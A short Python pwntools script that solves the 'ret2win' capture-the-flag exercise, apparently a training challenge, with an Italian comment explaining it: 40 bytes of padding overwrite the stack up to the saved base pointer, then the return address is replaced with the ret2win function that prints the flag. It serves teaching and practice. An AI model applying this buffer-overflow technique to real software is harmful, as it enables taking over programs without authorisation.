from pwn import *

elf = ELF("./ret2win")

p = process("./ret2win")
p.recvline()

"""
Qui abbiamo la funzione ret2win che, se chiamata, stampa direttamente la flag. Basta sovrascrivere il return pointer con 
l'indirizzo di ret2win e il gioco Ã¨ fatto. Aggiungiamo quindi 40 byte casuali per arrivare fino al base pointer e poi
sovrascriviamo il return pointer con l'indirizzo.
"""

payload = b''
payload += p64(elf.symbols['ret2win'])

p.send(cyclic(40) + payload)
					   
p.interactive()
